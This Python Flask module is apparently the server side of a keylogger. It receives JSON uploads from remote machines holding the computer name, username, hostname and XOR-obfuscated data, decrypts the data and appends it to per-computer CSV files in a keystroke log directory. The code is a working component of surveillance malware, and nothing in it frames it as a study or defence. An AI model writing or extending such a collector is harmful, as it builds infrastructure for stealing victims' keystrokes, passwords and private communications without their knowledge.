from flask import jsonify, Response
import csv
import os
from typing import Dict, Any, Tuple
from modules.encryption import XorEncryption
from logger_config import logger
from config import Config

decryption = XorEncryption()


class Upload():

    def __init__(self, data:Dict[str, Any]):
        self.data = data

    def upload(self) -> Response:
        try:
            timestamp_str,computer_name, username, hostname,  decrypted_data = self.upload_part_one_get_values_from_json(self.data)
            return self.upload_part_three_check_for_file_and_write(timestamp_str,computer_name, username, hostname, decrypted_data)

        except Exception as e:
            logger.error(f"Error in upload: {str(e)}", exc_info=True)
            response = jsonify({"error": str(e)})
            response.status_code = 500
            return response

    def upload_part_one_get_values_from_json(self, data: Dict[str, Any]) -> Tuple[str, str, str, str, str]:
        """ Extracts fields from JSON and decrypts the data """
        computer_name = data.get("computer_name", "Unknown")
        username = data.get("username", "Unknown User")
        hostname = data.get("hostname", "Unknown Host")
        timestamp_str = data.get("timestamp", "Unknown Time")
        raw_data = data.get("encrypted_data", "No Data")
        decrypted_data = self.upload_part_two_decrypt_data(raw_data)
        return timestamp_str, computer_name, username, hostname, decrypted_data

    def upload_part_two_decrypt_data(self, raw_data: str) -> str:
        return decryption.decryption(raw_data)

    def upload_part_three_check_for_file_and_write(self, timestamp_str: str, computer_name: str, username: str, hostname: str, decrypted_data: str) -> Response:
        if not os.path.exists(Config.KEYSTROKES_DIR):
            os.makedirs(Config.KEYSTROKES_DIR)
        csv_file_path = os.path.join(Config.KEYSTROKES_DIR, f"computer_{computer_name}_logs.csv")
        file_exists = os.path.isfile(csv_file_path)

        with open(csv_file_path, mode="a", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["timestamp_str", "computer_name", "username", "hostname", "decrypted_data"])
            writer.writerow([ timestamp_str, computer_name, username, hostname, decrypted_data])
        logger.info(f"Data from {computer_name} successfully saved to {csv_file_path}!")
        response = jsonify({"status": "success"})
        response.status_code = 200
        return response
